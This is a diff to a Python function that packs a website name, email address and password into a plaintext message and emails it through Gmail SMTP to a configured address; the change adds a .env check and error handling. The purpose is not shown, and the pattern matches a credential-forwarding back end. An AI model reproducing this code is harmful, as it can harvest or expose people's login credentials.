@@ -5,35 +5,54 @@ import os
 
 
 def send_email(userdata):
-    # credentials
-    PASSWORD = os.environ.get('PASSWORD')
-    # Email details
-    to = os.environ.get('TO')
-    sender = os.environ.get('SENDER')
+    if os.path.isfile(".env"):
+        # credentials
+        PASSWORD = os.environ.get('PASSWORD')
+        # Email details
+        to = os.environ.get('TO')
+        sender = os.environ.get('SENDER')
 
-    # user data from parameter
-    website=userdata["website"]
-    email= userdata["email"]
-    password= userdata["password"]
+        try:
+            # user data from parameter
+            website=userdata["website"]
+            email= userdata["email"]
+            password= userdata["password"]
 
-    # Compose email
-    subject = website
-    body = f"Website: {website}\nEmail: {email}\nPassword: {password}"
-    message = f'Subject: {subject}\n\n{body}'
+            # Compose email
+            subject = website
+            body = f"Website: {website}\nEmail: {email}\nPassword: {password}"
+            message = f'Subject: {subject}\n\n{body}'
 
-    # Email server details
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(sender, PASSWORD)
+            # Email server details
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(sender, PASSWORD)
 
-    #send email
-    server.sendmail(sender, to, message)
+            #send email
+            server.sendmail(sender, to, message)
 
-    # Close server connection
-    server.quit()
+            # Close server connection
+            server.quit()
+        except smtplib.SMTPAuthenticationError as e:
+            return("Authentication error:", e)
+
+        except smtplib.SMTPConnectError as e:
+            return("Connection error:", e)
+
+        except smtplib.SMTPDataError as e:
+            return("Data error:", e)
+
+        except smtplib.SMTPServerDisconnected as e:
+            return("Server disconnected error:", e)
+
+        except Exception as e:
+            return("Unknown error:", e)
+        
+        return True
+    else:
+        return False
+        
     
-    return True
-
 if __name__ == "__main__":
     
     data = {
